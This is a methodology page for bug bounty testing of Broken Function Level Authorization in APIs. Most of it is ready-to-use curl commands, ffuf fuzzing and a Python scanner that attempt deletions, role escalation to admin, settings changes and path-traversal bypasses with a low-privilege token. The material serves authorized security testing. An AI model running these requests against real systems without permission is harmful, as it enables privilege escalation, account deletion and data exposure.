---
id: "bfla-authorization-testing"
title: "BFLA - Broken Function Level Authorization Testing"
type: "technique"
category: "api-security"
subcategory: "authorization"
tags: ["api", "bfla", "authorization", "owasp-api-top-10", "privilege-escalation", "method-switching", "bug-bounty"]
platforms: ["linux", "macos", "windows"]
related: ["idor-bola", "api-resource-consumption", "shadow-zombie-api", "webhook-security"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# BFLA - Broken Function Level Authorization (OWASP API5:2023)

## Overview

BFLA occurs when API users can access functions/endpoints for which they are not authorized. Unlike BOLA (object-level: accessing other users' data by changing IDs), BFLA is about accessing entire endpoints or HTTP methods that should be restricted to higher-privilege roles.

**Key distinction**: BOLA = parameter manipulation within authorized endpoints. BFLA = accessing endpoints you should not reach at all.

**Bug bounty context**: BFLA findings are typically High to Critical. Method switching (GET->DELETE) on user data endpoints is especially impactful.

## Testing Methodology

### Step 1: Map All API Endpoints

```bash
# From API documentation
curl -s https://target.com/swagger.json | jq '.paths | keys[]'
curl -s https://target.com/openapi.json | jq '.paths | keys[]'

# From traffic interception (Burp Suite)
# Export all unique endpoints from proxy history

# From JavaScript files
cat app.js | grep -oE '"/(api|v[0-9])/[^"]*"' | sort -u

# From mobile app decompilation
grep -rn "api/" decompiled_app/ | grep -oE '"/[^"]*"' | sort -u
```

### Step 2: Identify Role-Based Endpoints

```
Look for keywords in endpoint paths:
/admin/          /manage/         /internal/
/config/         /settings/       /dashboard/
/users/          /roles/          /permissions/
/delete          /create          /update
/export          /import          /bulk
/debug           /test            /staging
/approve         /reject          /review
```

### Step 3: HTTP Method Switching

```bash
# If an endpoint accepts GET, try all other methods with lower-priv token

# Original (user can list items)
curl -X GET https://api.target.com/api/v1/users \
  -H "Authorization: Bearer $USER_TOKEN"

# Try destructive methods with same token
curl -X DELETE https://api.target.com/api/v1/users/123 \
  -H "Authorization: Bearer $USER_TOKEN"

curl -X PUT https://api.target.com/api/v1/users/123 \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

curl -X PATCH https://api.target.com/api/v1/users/123 \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"is_admin": true}'

curl -X POST https://api.target.com/api/v1/users \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker", "role": "admin"}'
```

### Step 4: Vertical Privilege Escalation

```bash
# Attempt admin endpoints with regular user token
# Common admin-only operations:

# User management
curl -X GET https://api.target.com/api/admin/users \
  -H "Authorization: Bearer $USER_TOKEN"

# Configuration
curl -X GET https://api.target.com/api/admin/settings \
  -H "Authorization: Bearer $USER_TOKEN"

curl -X PUT https://api.target.com/api/admin/settings \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"registration_enabled": true}'

# Bulk operations
curl -X POST https://api.target.com/api/admin/export/users \
  -H "Authorization: Bearer $USER_TOKEN"

# Role modification
curl -X POST https://api.target.com/api/admin/roles/assign \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"user_id": "MY_ID", "role": "admin"}'
```

### Step 5: Horizontal Function Access

```bash
# Test functions across same-level roles
# E.g., regular user accessing moderator functions

curl -X POST https://api.target.com/api/posts/123/approve \
  -H "Authorization: Bearer $USER_TOKEN"

curl -X DELETE https://api.target.com/api/posts/456/remove \
  -H "Authorization: Bearer $USER_TOKEN"

curl -X POST https://api.target.com/api/users/789/ban \
  -H "Authorization: Bearer $USER_TOKEN"
```

### Step 6: Path Traversal in API Routes

```bash
# Try accessing admin routes via path manipulation
curl https://api.target.com/api/v1/./admin/users \
  -H "Authorization: Bearer $USER_TOKEN"

curl https://api.target.com/api/v1/users/../admin/settings \
  -H "Authorization: Bearer $USER_TOKEN"

# URL encoding bypass
curl https://api.target.com/api/v1/%61dmin/users \
  -H "Authorization: Bearer $USER_TOKEN"

# Case variation
curl https://api.target.com/api/v1/Admin/users \
  -H "Authorization: Bearer $USER_TOKEN"

curl https://api.target.com/api/v1/ADMIN/users \
  -H "Authorization: Bearer $USER_TOKEN"
```

### Step 7: Content-Type Switching

```bash
# Some endpoints validate authz differently based on content type
curl -X POST https://api.target.com/api/admin/action \
  -H "Authorization: Bearer $USER_TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<request><action>delete_user</action><id>123</id></request>'

# JSON to form-data
curl -X POST https://api.target.com/api/admin/action \
  -H "Authorization: Bearer $USER_TOKEN" \
  -F "action=delete_user" -F "id=123"
```

## Automated Testing

### Burp Suite Authorize Extension
```
1. Install Authorize extension from BApp Store
2. Configure:
   - Set low-privilege user's cookies/tokens
   - Set unauthenticated state (no auth headers)
3. Browse app as admin user
4. Authorize replays every request with low-priv and no-auth tokens
5. Color-coded results show BFLA vulnerabilities
```

### Ffuf Method Fuzzing
```bash
# Fuzz HTTP methods on all endpoints
ffuf -w methods.txt:METHOD -w endpoints.txt:URL \
  -u https://api.target.com/URL \
  -X METHOD \
  -H "Authorization: Bearer $USER_TOKEN" \
  -mc 200,201,204 \
  -o bfla_results.json

# methods.txt:
# GET
# POST
# PUT
# DELETE
# PATCH
# OPTIONS
# HEAD
```

### Custom Script
```python
import requests

ADMIN_TOKEN = "admin_jwt_here"
USER_TOKEN = "user_jwt_here"
BASE = "https://api.target.com"

endpoints = [
    "/api/admin/users",
    "/api/admin/settings",
    "/api/admin/export",
    "/api/users/{id}/delete",
    "/api/users/{id}/role",
]

methods = ["GET", "POST", "PUT", "DELETE", "PATCH"]

for ep in endpoints:
    for method in methods:
        r = requests.request(method, BASE + ep,
                           headers={"Authorization": f"Bearer {USER_TOKEN}"},
                           timeout=10)
        if r.status_code in [200, 201, 204]:
            print(f"[BFLA!] {method} {ep} -> {r.status_code}")
            print(f"  Response: {r.text[:200]}")
```

## Response Code Analysis

```
200/201/204 with user token on admin endpoint -> BFLA CONFIRMED
403 -> Properly protected
401 -> Auth required (not authz check)
404 -> Endpoint might not exist, or hiding behind 404
405 Method Not Allowed -> Method restriction in place
500 -> Server error, might indicate partial processing (still interesting)
```

## High-Impact BFLA Patterns

```
1. User can DELETE other users' accounts
2. User can modify roles/permissions
3. User can access admin dashboard data
4. User can export/download all user data
5. User can modify application configuration
6. User can approve/reject workflows meant for admins
7. User can access internal/debug endpoints
8. User can create API keys with elevated permissions
```

## Tools
- **Burp Suite + Authorize** — Automated BFLA testing
- **OWASP ZAP** — API security scanning
- **Postman** — Manual API testing with role switching
- **ffuf** — Method and endpoint fuzzing
- **Autoswagger** — Swagger endpoint discovery and testing
- **Arjun** — Hidden parameter discovery
